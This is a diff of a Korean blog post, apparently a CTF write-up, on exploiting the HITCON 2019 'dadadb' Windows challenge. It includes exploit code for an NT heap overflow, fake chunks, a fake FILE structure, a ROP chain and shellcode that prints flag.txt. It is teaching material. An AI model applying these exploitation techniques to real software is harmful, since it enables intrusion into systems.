@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.8k 자
+      2.4k 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      35
+      47
        분
     </span>
   
@@ -240,30 +240,30 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <h2 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h2><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p>
-<p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p>
-<p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</a></p>
-<p><a href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb</a></p>
-<p>안녕하세요 L0ch입니다! 오늘 드디어 시리즈 마지막 글로 돌아왔습니다!</p>
-<p>이전 글에서 heap overflow - LFH reuse attack으로 익스에 필요한 주소들을 leak 했으니 이제 남은 건 익스뿐입니다! 익스 하려면 갈 길이 머니 바로 본론으로 들어가보도록 하겠습니다.</p>
-<h1 id="Exploit-scenario"><a href="#Exploit-scenario" class="headerlink" title="Exploit scenario"></a>Exploit scenario</h1><p>로그인 체크를 하는 <code>sub_10D0</code> 함수에서는 user와 password를 받고 <code>user.txt</code> 파일을 열어 비교한 뒤 로그인 성공 혹은 실패를 반환합니다.</p>
+              <h2 id="&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h2><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 1 - pwntools for windows</a></p>
+<p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 2 - NT Heap</a></p>
+<p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 3 - NT Heap(2)</a></p>
+<p><a href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 4 - HITCON 2019 dadadb</a></p>
+<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC624;&#xB298; &#xB4DC;&#xB514;&#xC5B4; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
+<p>&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; heap overflow - LFH reuse attack&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; leak &#xD588;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xB0A8;&#xC740; &#xAC74; &#xC775;&#xC2A4;&#xBFD0;&#xC785;&#xB2C8;&#xB2E4;! &#xC775;&#xC2A4; &#xD558;&#xB824;&#xBA74; &#xAC08; &#xAE38;&#xC774; &#xBA38;&#xB2C8; &#xBC14;&#xB85C; &#xBCF8;&#xB860;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<h1 id="Exploit-scenario"><a href="#Exploit-scenario" class="headerlink" title="Exploit scenario"></a>Exploit scenario</h1><p>&#xB85C;&#xADF8;&#xC778; &#xCCB4;&#xD06C;&#xB97C; &#xD558;&#xB294; <code>sub_10D0</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; user&#xC640; password&#xB97C; &#xBC1B;&#xACE0; <code>user.txt</code> &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; &#xBE44;&#xAD50;&#xD55C; &#xB4A4; &#xB85C;&#xADF8;&#xC778; &#xC131;&#xACF5; &#xD639;&#xC740; &#xC2E4;&#xD328;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled.png"></p>
-<p>입력한 user와 password가 저장되는 bss 영역을 보면 <code>input_pw+0x20</code> 위치에 파일 포인터가 저장되는 것을 볼 수 있네요!</p>
+<p>&#xC785;&#xB825;&#xD55C; user&#xC640; password&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; bss &#xC601;&#xC5ED;&#xC744; &#xBCF4;&#xBA74; <code>input_pw+0x20</code> &#xC704;&#xCE58;&#xC5D0; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;!</p>
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%204.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled 4.png"></p>
-<p>그런데 user와 password를 입력받을 때 <code>0x20</code> 만큼 입력받네요. 그럼 파일 포인터를 overwrite 할 수 있겠죠? 이를 이용해 fake file structure를 구성하면 arbitrary write가 가능합니다.</p>
-<p>대략적인 exploit 시나리오는 아래와 같습니다.</p>
+<p>&#xADF8;&#xB7F0;&#xB370; user&#xC640; password&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC744; &#xB54C; <code>0x20</code> &#xB9CC;&#xD07C; &#xC785;&#xB825;&#xBC1B;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xB97C; overwrite &#xD560; &#xC218; &#xC788;&#xACA0;&#xC8E0;? &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; fake file structure&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xBA74; arbitrary write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>&#xB300;&#xB7B5;&#xC801;&#xC778; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li>heap overflow로 bss 영역에 fake chunk 생성</li>
-<li>fake chunk에 fake file structure 구성</li>
-<li>파일 포인터가 fake file structure를 가리키도록 overwrite</li>
-<li>arbitrary write로 return address를 rop chain 주소로 overwrite</li>
+<li>heap overflow&#xB85C; bss &#xC601;&#xC5ED;&#xC5D0; fake chunk &#xC0DD;&#xC131;</li>
+<li>fake chunk&#xC5D0; fake file structure &#xAD6C;&#xC131;</li>
+<li>&#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xAC00; fake file structure&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; overwrite</li>
+<li>arbitrary write&#xB85C; return address&#xB97C; rop chain &#xC8FC;&#xC18C;&#xB85C; overwrite</li>
 <li>GET FLAG!!</li>
 </ol>
-<p>이제 시나리오대로 하나씩 살펴보도록 하겠습니다!</p>
-<h1 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h1><p>NT heap은 같은 크기의 해제된 chunk를 <code>ListHints</code>에서 double linked list로 관리합니다. 해제된 chunk의 data 위치에는 <code>fd</code> 와 <code>bk</code> 가 저장되고 각각 이전 chunk, 다음 chunk를 가리키며 이후에 같은 크기로 재 할당할 때 <code>ListHints</code>를 참조해 먼저 해제된 순서대로 할당합니다.</p>
-<p><code>A~D</code>를 할당하고 <code>B</code>와 <code>D</code>를 해제한 뒤의 상황을 그림으로 간단하게 나타내면 아래와 같습니다. 리눅스의 Heap 관리랑 비슷한 면이 있네요. </p>
+<p>&#xC774;&#xC81C; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB300;&#xB85C; &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
+<h1 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h1><p>NT heap&#xC740; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xC758; &#xD574;&#xC81C;&#xB41C; chunk&#xB97C; <code>ListHints</code>&#xC5D0;&#xC11C; double linked list&#xB85C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xC81C;&#xB41C; chunk&#xC758; data &#xC704;&#xCE58;&#xC5D0;&#xB294; <code>fd</code> &#xC640; <code>bk</code> &#xAC00; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xAC01;&#xAC01; &#xC774;&#xC804; chunk, &#xB2E4;&#xC74C; chunk&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xBA70; &#xC774;&#xD6C4;&#xC5D0; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xB85C; &#xC7AC; &#xD560;&#xB2F9;&#xD560; &#xB54C; <code>ListHints</code>&#xB97C; &#xCC38;&#xC870;&#xD574; &#xBA3C;&#xC800; &#xD574;&#xC81C;&#xB41C; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p><code>A~D</code>&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; <code>B</code>&#xC640; <code>D</code>&#xB97C; &#xD574;&#xC81C;&#xD55C; &#xB4A4;&#xC758; &#xC0C1;&#xD669;&#xC744; &#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9AC;&#xB205;&#xC2A4;&#xC758; Heap &#xAD00;&#xB9AC;&#xB791; &#xBE44;&#xC2B7;&#xD55C; &#xBA74;&#xC774; &#xC788;&#xB124;&#xC694;. </p>
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%205.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled%205.png"></p>
-<p><code>A chunk</code>에서 heap overflow를 트리거하면 해제된 <code>B chunk</code>의 주소와 <code>header</code>를 leak할 수 있습니다.</p>
+<p><code>A chunk</code>&#xC5D0;&#xC11C; heap overflow&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xBA74; &#xD574;&#xC81C;&#xB41C; <code>B chunk</code>&#xC758; &#xC8FC;&#xC18C;&#xC640; <code>header</code>&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs php">add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)
 add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)
 add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)
@@ -273,7 +273,7 @@ delete(<span class="hljs-string">&quot;B&quot;</span>)
 delete(<span class="hljs-string">&quot;D&quot;</span>)
 
 <span class="hljs-comment"># leak B - header, fd, bk, chunk address</span>
-view(<span class="hljs-string">&#x27;A&#x27;</span>)
+view(<span class="hljs-string">&apos;A&apos;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)
 p.recv(<span class="hljs-number">0x108</span>)
 header = u64(p.recv(<span class="hljs-number">8</span>))
@@ -283,7 +283,7 @@ p.recv(<span class="hljs-number">0x210</span>)
 D_fd = u64(p.recv(<span class="hljs-number">8</span>))
 D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span></code></pre>
 
-<p>이제 <code>user</code>와 <code>pwd</code> 위치에 2개의 fake chunk를 만드는데, leak 한 <code>B chunk</code> 주소와 <code>header</code>를 이용해 <code>B chunk</code>와 연결되도록 합니다. 이때 각각의 fake chunk의 header에 기존 user와 password를 포함해야 로그인 체크 함수를 통과할 수 있습니다.  <code>B chunk</code>의 <code>fd</code>에는 우리가 만든 fake chunk를 가리키도록 overwrite 하면 되겠네요.</p>
+<p>&#xC774;&#xC81C; <code>user</code>&#xC640; <code>pwd</code> &#xC704;&#xCE58;&#xC5D0; 2&#xAC1C;&#xC758; fake chunk&#xB97C; &#xB9CC;&#xB4DC;&#xB294;&#xB370;, leak &#xD55C; <code>B chunk</code> &#xC8FC;&#xC18C;&#xC640; <code>header</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>B chunk</code>&#xC640; &#xC5F0;&#xACB0;&#xB418;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAC01;&#xAC01;&#xC758; fake chunk&#xC758; header&#xC5D0; &#xAE30;&#xC874; user&#xC640; password&#xB97C; &#xD3EC;&#xD568;&#xD574;&#xC57C; &#xB85C;&#xADF8;&#xC778; &#xCCB4;&#xD06C; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xACFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  <code>B chunk</code>&#xC758; <code>fd</code>&#xC5D0;&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; fake chunk&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; overwrite &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p>
 <pre><code class="hljs php">user = imagebase + <span class="hljs-number">0x5620</span>
 pwd = imagebase + <span class="hljs-number">0x5648</span>
 
@@ -308,9 +308,9 @@ fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span
 
 login(fake_user, fake_pwd)</code></pre>
 
-<p>현재 free된 chunk들의 double linked list는 아래 그림과 같습니다!</p>
+<p>&#xD604;&#xC7AC; free&#xB41C; chunk&#xB4E4;&#xC758; double linked list&#xB294; &#xC544;&#xB798; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%206.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled%206.png"></p>
-<p>다음은 <code>B chunk</code>에 fake file structure를 구성할 차례입니다. File Structure에 대한 자세한 내용은 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with File Structure</a> 슬라이드를 참고하면 되며 <code>_base</code> 필드에 임의의 주소를 쓰는 것으로 arbitrary write가 가능합니다. 따라서 <code>_base</code>에 return address를 주면 됩니다!</p>
+<p>&#xB2E4;&#xC74C;&#xC740; <code>B chunk</code>&#xC5D0; fake file structure&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. File Structure&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with File Structure</a> &#xC2AC;&#xB77C;&#xC774;&#xB4DC;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB418;&#xBA70; <code>_base</code> &#xD544;&#xB4DC;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC4F0;&#xB294; &#xAC83;&#xC73C;&#xB85C; arbitrary write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>_base</code>&#xC5D0; return address&#xB97C; &#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p>
 <pre><code class="hljs php">cnt = <span class="hljs-number">0</span>
 _ptr = <span class="hljs-number">0</span>
 _base = ret
@@ -321,7 +321,7 @@ obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)
 obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)
 obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span></code></pre>
 
-<p>return address에는 stack base에서 <code>call &lt;func&gt;</code> 다음 instruction이 들어가므로 <code>write</code> 함수 호출 직후 instruction이 있는지 확인하면서 찾으면 쉽게 찾을 수 있습니다.</p>
+<p>return address&#xC5D0;&#xB294; stack base&#xC5D0;&#xC11C; <code>call &lt;func&gt;</code> &#xB2E4;&#xC74C; instruction&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xBBC0;&#xB85C; <code>write</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC9C1;&#xD6C4; instruction&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C; &#xCC3E;&#xC73C;&#xBA74; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs php">ret_ins = imagebase+<span class="hljs-number">0x1b60</span>  
 ret = stack+<span class="hljs-number">0x2500</span>
 <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):
@@ -329,30 +329,27 @@ ret = stack+<span class="hljs-number">0x2500</span>
 		<span class="hljs-keyword">break</span>
 	ret += <span class="hljs-number">8</span></code></pre>
 
-<p>이제 해제한 <code>B chunk</code>를 재할당해 <code>B</code>에 fake file structure를 쓴 후 한번 더 할당하면 우리가 만든 fake chunk가 할당되는데, <code>pwd+0x20</code> 에 파일 포인터가 있었으니 header 크기 16 bytes를 제외한 16만큼 dummy를 채우고 <code>B chunk</code>의 주소로 파일 포인터를 overwrite 합니다.</p>
+<p>&#xC774;&#xC81C; &#xD574;&#xC81C;&#xD55C; <code>B chunk</code>&#xB97C; &#xC7AC;&#xD560;&#xB2F9;&#xD574; <code>B</code>&#xC5D0; fake file structure&#xB97C; &#xC4F4; &#xD6C4; &#xD55C;&#xBC88; &#xB354; &#xD560;&#xB2F9;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; fake chunk&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xB294;&#xB370;, <code>pwd+0x20</code> &#xC5D0; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC788;&#xC5C8;&#xC73C;&#xB2C8; header &#xD06C;&#xAE30; 16 bytes&#xB97C; &#xC81C;&#xC678;&#xD55C; 16&#xB9CC;&#xD07C; dummy&#xB97C; &#xCC44;&#xC6B0;&#xACE0; <code>B chunk</code>&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xB97C; overwrite &#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs php">add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>
 add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span></code></pre>
 
-
-
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>이제 남은 건 rop chain을 구성해서 <code>flag.txt</code>의 파일의 내용을 가져와 출력하기만 하면 됩니다! </p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>&#xC774;&#xC81C; &#xB0A8;&#xC740; &#xAC74; rop chain&#xC744; &#xAD6C;&#xC131;&#xD574;&#xC11C; <code>flag.txt</code>&#xC758; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xAC00;&#xC838;&#xC640; &#xCD9C;&#xB825;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! </p>
 <ul>
-<li><p><code>readfile</code>을 호출해 shellcode 입력</p>
+<li><p><code>readfile</code>&#xC744; &#xD638;&#xCD9C;&#xD574; shellcode &#xC785;&#xB825;</p>
 <ul>
-<li><p><code>stdin</code>, <code>stdout</code>은  <code>peb+0x20</code>에 위치한 <code>ProcessParameter</code> 구조체에서 leak</p>
+<li><p><code>stdin</code>, <code>stdout</code>&#xC740;  <code>peb+0x20</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>ProcessParameter</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; leak</p>
 <pre><code class="hljs python">process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)
 stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)
-stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)</code></pre>
-</li>
+stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)</code></pre></li>
 </ul>
 </li>
-<li><p><code>virtualprotect</code>로 shellcode 주소의 실행 권한 허용 후 shellcode로 jump</p>
+<li><p><code>virtualprotect</code>&#xB85C; shellcode &#xC8FC;&#xC18C;&#xC758; &#xC2E4;&#xD589; &#xAD8C;&#xD55C; &#xD5C8;&#xC6A9; &#xD6C4; shellcode&#xB85C; jump</p>
 </li>
-<li><p>shellcode는 <code>flag.txt</code>를 읽어 stdout으로 출력</p>
+<li><p>shellcode&#xB294; <code>flag.txt</code>&#xB97C; &#xC77D;&#xC5B4; stdout&#xC73C;&#xB85C; &#xCD9C;&#xB825;</p>
 </li>
 </ul>
-<p>필요한 gadget은 <a target="_blank" rel="external nofollow noopener noreferrer" href="http://ropshell.com/search">http://ropshell.com</a> 에 익스 환경의 <code>ntdll.dll</code>을 업로드해 찾으면 되며<code>virtualprotect</code>, <code>readfile</code>, <code>writefile</code>, <code>createfile</code> 는 <code>kernel32.dll</code>에서 찾을 수 있습니다.</p>
-<p>아래는 전체 <code>exploit.py</code> 입니다. </p>
+<p>&#xD544;&#xC694;&#xD55C; gadget&#xC740; <a target="_blank" rel="external nofollow noopener noreferrer" href="http://ropshell.com/search">http://ropshell.com</a> &#xC5D0; &#xC775;&#xC2A4; &#xD658;&#xACBD;&#xC758; <code>ntdll.dll</code>&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD574; &#xCC3E;&#xC73C;&#xBA74; &#xB418;&#xBA70;<code>virtualprotect</code>, <code>readfile</code>, <code>writefile</code>, <code>createfile</code> &#xB294; <code>kernel32.dll</code>&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC544;&#xB798;&#xB294; &#xC804;&#xCCB4; <code>exploit.py</code> &#xC785;&#xB2C8;&#xB2E4;. </p>
 <pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">import</span> time
 
@@ -387,7 +384,7 @@ stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)</
 	p.sendline(key)
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>
-	add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))
+	add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span> + p64(addr))
 	view(key)
 	p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)
 	<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))
@@ -409,7 +406,7 @@ login(<span class="hljs-string">&quot;ddaa&quot;</span>,<span class="hljs-string
 
 delete(<span class="hljs-string">&quot;LFH5&quot;</span>)
 
-add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)
+add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span>)
 view(<span class="hljs-string">&quot;LFH4&quot;</span>)
 
 <span class="hljs-comment">#leak heap base</span>
@@ -451,7 +448,7 @@ delete(<span class="hljs-string">&quot;B&quot;</span>)
 delete(<span class="hljs-string">&quot;D&quot;</span>)
 
 <span class="hljs-comment"># leak header, fd, bk, chunk address</span>
-view(<span class="hljs-string">&#x27;A&#x27;</span>)
+view(<span class="hljs-string">&apos;A&apos;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)
 p.recv(<span class="hljs-number">0x108</span>)
 header = u64(p.recv(<span class="hljs-number">8</span>))
@@ -521,7 +518,7 @@ rop_buf += p64(pop_rdx_rcx_r8_to_r11)
 rop_buf += p64(<span class="hljs-number">0x1000</span>) + p64(sc_address) + p64(<span class="hljs-number">0x40</span>) + p64(sc_address + <span class="hljs-number">0x100</span> <span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(virtualprotect) + p64(sc_address)
 p.send(rop_buf.ljust(<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)+p64(<span class="hljs-number">4</span>))
 
-shellcode = <span class="hljs-string">f&#x27;&#x27;&#x27;</span>
+shellcode = <span class="hljs-string">f&apos;&apos;&apos;</span>
 <span class="hljs-string">	jmp readflag</span>
 <span class="hljs-string">flag:</span>
 <span class="hljs-string">	pop r11</span>
@@ -533,7 +530,7 @@ shellcode = <span class="hljs-string">f&#x27;&#x27;&#x27;</span>
 <span class="hljs-string">	mov r8, 1</span>
 <span class="hljs-string">	mov rdx, 0x80000000</span>
 <span class="hljs-string">	mov rcx, r11</span>
-<span class="hljs-string">	mov rax, <span class="hljs-subst">&#123;createfile&#125;</span></span>
+<span class="hljs-string">	mov rax, <span class="hljs-subst">{createfile}</span></span>
 <span class="hljs-string">	call rax</span>
 <span class="hljs-string">readfile:</span>
 <span class="hljs-string">	mov qword ptr [rsp + 0x20], 0</span>
@@ -541,40 +538,40 @@ shellcode = <span class="hljs-string">f&#x27;&#x27;&#x27;</span>
 <span class="hljs-string">	mov r8, 0x100</span>
 <span class="hljs-string">	lea rdx, [rsp + 0x100]</span>
 <span class="hljs-string">	mov rcx, rax</span>
-<span class="hljs-string">	mov rax, <span class="hljs-subst">&#123;readfile&#125;</span></span>
+<span class="hljs-string">	mov rax, <span class="hljs-subst">{readfile}</span></span>
 <span class="hljs-string">	call rax</span>
 <span class="hljs-string">writefile:</span>
 <span class="hljs-string">	mov qword ptr [rsp + 0x20], 0</span>
 <span class="hljs-string">	lea r9, [rsp + 0x200]</span>
 <span class="hljs-string">	mov r8, 0x100</span>
 <span class="hljs-string">	lea rdx, [rsp + 0x100]</span>
-<span class="hljs-string">	mov rcx, <span class="hljs-subst">&#123;stdout&#125;</span></span>
-<span class="hljs-string">	mov rax, <span class="hljs-subst">&#123;writefile&#125;</span></span>
+<span class="hljs-string">	mov rcx, <span class="hljs-subst">{stdout}</span></span>
+<span class="hljs-string">	mov rax, <span class="hljs-subst">{writefile}</span></span>
 <span class="hljs-string">	call rax</span>
 <span class="hljs-string">loop:</span>
